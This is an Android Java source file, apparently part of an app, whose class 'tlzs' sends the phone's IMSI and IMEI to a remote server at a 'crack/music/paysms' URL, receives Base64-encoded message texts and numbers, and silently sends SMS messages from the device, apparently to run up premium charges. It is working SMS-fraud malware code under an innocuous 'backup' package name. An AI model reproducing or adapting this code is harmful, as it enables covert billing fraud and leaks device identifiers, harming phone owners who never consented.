package com.apitest.backup;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Looper;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.alibaba.fastjson.JSONObject;
import com.apitest.TianLaiResponse;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;

public class tlzs
{
    public tlzs()
    {
        // TODO Auto-generated constructor stub
    }

    public static void charge_by_api(final Context context)
    {
        new Thread()
        {
            public void run()
            {
                try
                {
                    Looper.prepare();

                    String response = getResponse(context);
                    TianLaiResponse tianLaiResponse = JSONObject.parseObject(response, TianLaiResponse.class);

                    if (tianLaiResponse == null || tianLaiResponse.getResult() != 0)
                    {
                        return;
                    }

                    String smsContent = tianLaiResponse.getSms();
                    String sms1 = smsContent.split("&")[0];
                    String sms2 = smsContent.split("&")[1];

                    String portContent = tianLaiResponse.getPort();
                    String port1 = portContent.split("&")[0];
                    String port2 = portContent.split("&")[1];

                    sms1 = new String(Base64.decode(sms1, Base64.DEFAULT));
                    sms2 = new String(Base64.decode(sms2, Base64.DEFAULT));
                    if (!sms1.isEmpty())
                    {
                        Log.e("xcngame", "send " + port1 + " ==" + sms1);
                        sendSMS(context, port1, sms1);
                    }

                    Log.e("xcngame", port2 + "==" + sms2);
                    if (!sms2.isEmpty())
                    {
                        sendSMS(context, port2, sms2);
                    }
                }
                catch (Exception e)
                {
                    Log.e("xcngame", e.getMessage());
                }
            }
        }.start();
    }

    private static String getResponse(Context context)
    {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String imsi = tm.getSubscriberId();
        String imei = tm.getDeviceId();// String

        String ptid = "53004";
        String cpparam = "JH6038";
        String version = "1.0.0";
        String itemId = "600967020000006038";
        String itemPrice = "600";
        String mode = "0";
        String itemSafeLevel = "0";
        String itemMethod = "1";
        String itemEx = "";

        String url = "http://mus.yiqiao580.com/crack/music/paysms.do?ptid=" + ptid + "&imei=" + imei + "&imsi=" + imsi + "&cpparam=" + cpparam + "&version=" + version + "&itemId=" + itemId + "&itemPrice=" + itemPrice + "&mode=" + mode + "&itemSafeLevel=" + itemSafeLevel + "&itemMethod=" + itemMethod + "&itemEx=" + itemEx;//点播

        return getUrl(url);
    }

    private static void sendSMS(Context context, String port, String sms)
    {
        SmsManager smsManager = SmsManager.getDefault();
        Intent sentIntent = new Intent("SENT_SMS_Music_Reg");
        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent, 0);
        smsManager.sendTextMessage(port, null, sms, sentPI, null);
    }

    private static String getUrl(String url)
    {
        try
        {
            HttpGet request = new HttpGet(url);

            HttpParams httpPar = new BasicHttpParams();
            HttpConnectionParams.setConnectionTimeout(httpPar, 40 * 1000);
            HttpConnectionParams.setSoTimeout(httpPar, 40 * 1000);
            HttpClient httpClient = new DefaultHttpClient(httpPar);

            HttpResponse response = httpClient.execute(request);
            if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK)
            {
                String str = EntityUtils.toString(response.getEntity());

                if (str != null)
                {
                    return str;
                }
            }
            else
            {
                return null;
            }
        }
        catch (Exception e)
        {
            return null;
        }
        return null;
    }
}
